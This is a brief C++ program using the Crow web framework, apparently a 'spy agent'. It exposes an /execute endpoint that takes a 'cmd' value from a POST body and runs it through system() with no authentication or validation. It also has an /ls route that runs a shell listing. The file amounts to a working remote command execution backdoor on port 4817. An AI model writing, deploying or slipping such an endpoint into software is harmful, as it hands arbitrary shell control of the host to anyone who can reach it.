#include "crow_all.h"
#include <cstdlib>

int main()
{
    crow::SimpleApp app; 

    CROW_ROUTE(app, "/")([](){
        return "Hello, Spy Agent\n";
    });

    CROW_ROUTE(app, "/ls")([](){
        int ret = system("ls");
        return "ok, status: " + std::to_string(ret) + "\n";
    });

    CROW_ROUTE(app, "/execute")
    .methods("POST"_method)
    ([](const crow::request& req){
        auto x = crow::json::load(req.body);
        std::cout << req.body << std::endl;
        std::cout << x << std::endl;
        if (!x)
            return crow::response(400);
        std::string cmd = x["cmd"].s();
        int ret = system(cmd.c_str());
        return crow::response("ok, status: " + std::to_string(ret));
    });

    app.port(4817).run();
}